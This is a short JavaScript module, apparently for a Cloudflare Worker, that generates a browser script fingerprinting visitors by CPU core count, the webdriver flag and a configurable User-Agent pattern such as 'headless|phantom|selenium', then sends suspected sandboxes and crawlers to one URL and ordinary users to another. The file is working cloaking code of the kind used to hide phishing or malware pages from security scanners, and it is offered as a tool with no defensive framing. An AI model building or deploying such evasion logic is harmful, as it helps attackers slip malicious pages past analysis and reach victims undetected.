export function CheckSandbox(sandbox_redirect_url, user_redirect_url, ua_pattern) {
    // Final (optional) check: match the browser User-Agent against a
    // configurable pattern coming from wrangler (UA_PATTERN).
    // Treated as a case-insensitive regex, so you can use wildcard-ish
    // keywords and alternations, e.g.:
    //   "Chrome"                       -> matches any Chrome/Chromium UA
    //   "headless|phantom|selenium"    -> common automation/sandbox markers
    //   "bot|crawler|spider"           -> crawlers
    // Empty/unset disables the check.
    // We JSON-encode the pattern so it is safely embedded as a string literal
    // inside the generated payload (prevents breaking out of the template).
    let uaPatternLiteral = JSON.stringify(ua_pattern || "");

    return `
(function() {
let initChecks = {
    "hwCon": (window.navigator.hardwareConcurrency < 8),
    "webDriver": !!window.webdriver,
}

// Final check (modular, configured from wrangler via UA_PATTERN).
// When a non-empty pattern is set, a User-Agent matching it is treated
// as a sandbox/bot.
let uaPattern = ${uaPatternLiteral};
let uaCheckEnabled = uaPattern.length > 0;
if (uaCheckEnabled) {
    let uaMatch = false;
    try {
        let ua = window.navigator.userAgent || "";
        uaMatch = new RegExp(uaPattern, "i").test(ua);
    } catch (e) {
        uaMatch = false;
    }
    initChecks["uaMatch"] = uaMatch;
}

let matchSandbox = false;

let result = [];
for (let check in initChecks) {
    // Collect all results in an array to print later in an alert
    // result.push(check + " : " + initChecks[check]);
    if (initChecks[check]) {
        matchSandbox = check;
        break
    }
}

// Useful to debug the sandbox in case you do not have access to full BOM.
result.push("hwCon : " + window.navigator.hardwareConcurrency);
result.push("webDriver : " + window.webdriver);
if (uaCheckEnabled) {
    result.push("uaMatch : " + initChecks["uaMatch"]);
}
 

if (matchSandbox !== false ) {
    document.location = "${sandbox_redirect_url}/?"+result.join("__");
} else {
    document.location = "${user_redirect_url}/?"+result.join("__");
}
}).call(this)
  `
}
